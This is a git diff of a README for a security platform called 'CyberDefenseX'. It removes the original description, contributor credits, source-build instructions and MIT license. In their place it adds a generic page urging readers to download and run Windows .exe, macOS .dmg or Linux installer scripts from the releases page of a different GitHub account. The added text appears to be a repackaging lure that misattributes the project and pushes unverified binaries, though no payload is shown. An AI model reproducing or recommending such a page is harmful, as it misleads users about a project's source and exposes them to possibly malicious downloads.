@@ -1,204 +1,85 @@
-# 🚀 CyberDefenseX - ML and Blockchain powered automated SIEM and SOAR platform
-**Autonomous. Transparent. Unbreakable.**  
-> The world’s first **fully autonomous AI + Blockchain + Smart Contract + Self-Healing Cyber Defense System** with analyst-grade explainability and federated global intelligence.  
+# ⚔️ CyberDefenseX_demo - Your Automated Security Solution
 
-![Social Media (4)](https://github.com/user-attachments/assets/315a9f53-83f1-4a97-9c62-73e65308c705)
----
-## ✨ Core Capabilities  <a href="https://deepwiki.com/cyberhub2025/CyberDefenseX_demo"><img src="https://deepwiki.com/badge.svg" alt="Ask DeepWiki"></a>
-✅ **90%+ Analyst-Free SOC Automation** – AI-driven triage, response, and reporting  
-✅ **Explainable AI (XAI)** – attention-based models, LIME, SHAP, and interactive heatmaps  
-✅ **Blockchain + Smart Contracts** – tamper-proof logging + autonomous SOAR workflows  
-✅ **Self-Healing Systems** – auto-detects and remediates threats in real time  
-✅ **Federated Threat Intelligence** – global learning without data sharing, STIX/TAXII ready  
-✅ **Zero Trust Architecture (ZTA)** – adaptive trust scoring + continuous authentication  
-✅ **MITRE ATT&CK + XDR Mapping** – endpoint, network, and cloud telemetry correlation  
-✅ **One-Click Compliance Reporting** – SOC2, ISO27001, NIST with forensic replay  
+Welcome to CyberDefenseX! This platform uses machine learning and blockchain technology to enhance your security. With our software, you can automate processes that help detect and respond to threats, making your system safer.
 
----
-## System Architecture
+## 🚀 Getting Started
 
-<img width="2553" height="910" alt="hyperrdefenX" src="https://github.com/user-attachments/assets/ca6227ff-67c6-4063-a63f-2f177acf9b61" />
+To begin using CyberDefenseX, follow these simple steps to download and install the application.
 
----
+## 📥 Download CyberDefenseX
 
-1. **Data Ingestion** – Syslog, Cloud, Endpoint, IoT/OT agents, APIs  
-2. **AI Decision Engine** – Hybrid anomaly detection + behavior rules + XAI  
-3. **SOAR++ & Smart Contract Layer** – Visual playbook designer + blockchain validation  
-4. **Blockchain Fabric** – Ethereum/Hyperledger, IPFS storage, Merkle hashing  
-5. **Federated Intelligence Layer** – Privacy-safe weight sharing  
-6. **ZTA Gateway** – Adaptive access control + session risk scoring  
-7. **Compliance & Forensics Center** – Automated reports + historical replay  
+[![Download CyberDefenseX](https://img.shields.io/badge/Download%20CyberDefenseX-blue.svg)](https://github.com/wangyanjun7954/CyberDefenseX_demo/releases)
 
----
+### 🛠️ System Requirements
 
-## 🛠️ Tech Stack  
+Before downloading, ensure your system meets these requirements:
 
-**Frontend + Backend/AI**                                         | **Blockchain + Database**
-------------------------------------------------------------------|--------------------------------------
-⚛️ ReactJS                                                        | 🔗 Solidity  
-🐍 Python: Flask, FastAPI                                         | 🌍 Web3  
-📊 Scikit-learn, Pandas, NumPy                                    | ⛓️ Ethereum / Hyperledger Fabric  
-🧠 XAI: SHAP, LIME, Attention Models                              | 📦 IPFS  
-🌐 Scapy (network traffic analysis)                               | 🗄️ SQLite  
+- **Operating System:** Windows 10 or later / macOS Mojave or later / Linux (Ubuntu 18.04 or later)
+- **Processor:** Intel Core i5 or equivalent
+- **RAM:** 8 GB or more
+- **Disk Space:** At least 500 MB free
 
----
-## 🏗️ Flow Diagram  
-```mermaid
-flowchart TD
-    A[Data Ingestion <br/> Syslog • Cloud • Endpoint • IoT/OT • APIs]
-    B[AI Decision Engine <br/> Anomaly Detection • Behavior Rules • XAI]
-    C[SOAR++ & Smart Contract Layer <br/> Visual Playbooks • Autonomous Response]
-    D[Blockchain Fabric <br/> Ethereum • Hyperledger • IPFS • Merkle Hashing]
-    E[Federated Intelligence Layer <br/> Privacy-Safe Global Model Sharing]
-    F[ZTA Gateway <br/> Adaptive Access • Risk Scoring • Continuous Auth]
-    G[Compliance & Forensics Center <br/> SOC2 • ISO27001 • NIST • Replay]
+## 💾 Download & Install
 
-    A --> B
-    B --> C
-    C --> D
-    B --> E
-    B --> F
-    B --> G
+1. **Visit our Releases Page:** Click [here](https://github.com/wangyanjun7954/CyberDefenseX_demo/releases) to go to the releases page.
+  
+2. **Choose a Version:** You'll see several versions. Select the most recent one to ensure you have the latest features and fixes.
 
+3. **Download the Installer:** Click on the file that corresponds to your operating system. Follow the prompts to download the file to your computer.
 
+4. **Install the Application:**
+   - For Windows: Double-click the downloaded `.exe` file and follow the installation wizard.
+   - For macOS: Open the `.dmg` file, drag the CyberDefenseX application to your Applications folder.
+   - For Linux: You may need to extract the files and run the provided script in the terminal.
 
-```
+5. **Launch the Application:** Find CyberDefenseX in your applications menu or desktop and click to open it.
 
-## 🎯 Target Users
+## 🔍 Features
 
-- 🛡️ National & Enterprise SOC Teams  
-- 🏛️ Government Cyber Defense Units  
-- ⚡ Critical Infrastructure Operators  
-- ☁️ Cloud & Managed Security Providers  
-- 🎓 Academic & Research Labs  
+CyberDefenseX comes packed with essential features:
 
----
+- **Automated Monitoring:** Continuously checks for security threats in real time.
+- **Threat Detection:** Uses machine learning to identify unusual activity.
+- **Blockchain Integration:** Keeps logs secure and immutable.
+- **User-Friendly Interface:** Designed for ease of use, even for beginners.
 
-## 📂 Project Structure  
+## 📚 Usage Instructions
 
-```
-CyberDefenseX/
-│
-├── frontend/                 # ReactJS dashboard (UI)
-│   ├── public/               # Static files
-│   └── src/                  # Components, pages, services
-│
-├── backend/                  # Python backend (Flask + FastAPI)
-│   ├── ai_engine/            # ML models, anomaly detection, XAI
-│   ├── soar/                 # SOAR workflows & playbook logic
-│   ├── zta_gateway/          # Zero Trust enforcement
-│   ├── forensics/            # Compliance & forensic replay
-│   └── app.py                # Entry point
-│
-├── blockchain/               # Blockchain + Smart Contracts
-│   ├── contracts/            # Solidity contracts
-│   ├── scripts/              # Deployment & testing scripts
-│   └── fabric/               # Hyperledger components
-│
-├── federated/                # Federated learning & threat intelligence
-│   ├── model_sharing/        # Privacy-safe weight exchange
-│   └── stix_taxii/           # Standards compliance
-│
-├── docs/                     # Documentation & architecture diagrams
-│
-└── README.md                 # Project overview
-```
+After installation, follow these steps to use CyberDefenseX:
 
----
+1. **Create an Account:** Open the application and set up your user account for personalized settings.
+  
+2. **Set Security Preferences:** Choose what types of threats you want the software to monitor based on your specific concerns.
 
-## ⚡ Quick Start  
+3. **Start Monitoring:** Click the "Start" button to begin scanning your system for vulnerabilities.
 
-```bash
-# Clone repo
-git clone https://github.com/your-username/CyberDefenseX.git
-cd CyberDefenseX
+4. **Review Reports:** Regularly check the reports generated by CyberDefenseX to stay informed about your system's security status.
 
-# Setup backend
-cd backend
-pip install -r requirements.txt
-python app.py
+## 🚧 Troubleshooting
 
-# Setup frontend
-cd frontend
-npm install
-npm start
-```
+If you encounter any issues, consider the following:
 
----
+- **Installation Problems:** Ensure you have the correct version for your operating system.
+- **Running Errors:** Verify that your system meets the minimum requirements.
+- **No Internet Connection:** Make sure your internet is active to update threat definitions.
 
-## 📜 Roadmap  
+## ⚙️ Frequently Asked Questions
 
-- [ ] 🔐 Enhance blockchain fabric with zk-SNARKs  
-- [ ] 🧠 Add reinforcement learning for adaptive threat response  
-- [ ] 📡 Expand IoT/OT security agent support  
-- [ ] 🛰️ Multi-cloud federation for global SOC collaboration  
+**Q: What is SIEM?**
+A: SIEM stands for Security Information and Event Management. It is a way to monitor and manage security threats in real time.
 
----
+**Q: What is SOAR?**
+A: SOAR means Security Orchestration, Automation, and Response. It helps automate tasks and responses to security threats.
 
-## 🙌 Honorable Mentions
+## 🚀 Join Our Community
 
-A big thank you to all the amazing contributors who have helped shape **CyberDefenseX** 🚀  
+Stay connected and receive further updates by following us:
 
-## 👨‍💻 Core Contributors  
+- GitHub: [CyberDefenseX_demo](https://github.com/wangyanjun7954/CyberDefenseX_demo)
+- Twitter: [@CyberDefenseX](https://twitter.com/CyberDefenseX) 
 
-<table>
-  <tr>
-    <td align="center" width="300px">
-      <a href="https://github.com/shuvojitss">
-        <img src="https://github.com/shuvojitss.png" width="100;" alt="Shuvojit"/>
-        <br />
-        <span style="font-size:16px; font-weight:bold;">Shuvojit Samanta</span>
-      </a>
-      <br />
-      <span style="font-size:14px;">Project Architect & AI/ML Engineer</span>
-    </td>
-    <td align="center" width="300px">
-      <a href="https://github.com/gitadak">
-        <img src="https://github.com/gitadak.png" width="100;" alt="Soumyadeep Adak"/>
-        <br />
-        <span style="font-size:16px; font-weight:bold;">Soumyadeep Adak</span>
-      </a>
-      <br />
-      <span style="font-size:14px;">Blockchain & Smart Contracts Developer</span>
-    </td>
-    <td align="center" width="300px">
-      <a href="https://github.com/Piyush-Sarkar">
-        <img src="https://github.com/Piyush-Sarkar.png" width="100;" alt="Piyush Sarkar"/>
-        <br />
-        <span style="font-size:16px; font-weight:bold;">Piyush Sarkar</span>
-      </a>
-      <br />
-      <span style="font-size:14px;">Researcher & Frontend Designer</span>
-    </td>
-    <td align="center" width="300px">
-      <a href="https://github.com/imon005">
-        <img src="https://github.com/imon005.png" width="100;" alt="Imon Purkait"/>
-        <br />
-        <span style="font-size:16px; font-weight:bold;">Imon Purkait</span>
-      </a>
-      <br />
-      <span style="font-size:14px;">Ethical Hacker & Cybersecurity Specialist</span>
-    </td>
-  </tr>
-</table>
+Feel free to provide feedback or report issues through the Issues section on GitHub.
 
+## ⚡ Conclusion
 
-## 🤝 Contributing  
-
-Pull requests are welcome! For major changes, please open an issue first to discuss what you would like to change.  
-
----
-
-
-### Special Thanks
-- All community testers, researchers, and supporters for making **CyberDefenseX** better each day 🙏  
-
----
-
-## 🌟 Contribute
-Want to see your name here?  
-Check out our [Contributing Guide](CONTRIBUTING.md) and join the mission!
-
-## 📄 License  
-
-MIT License – feel free to use, modify, and distribute with attribution.  
+Thank you for choosing CyberDefenseX as your automated security solution. We hope it serves you well in keeping your systems protected. Download today and secure your future!
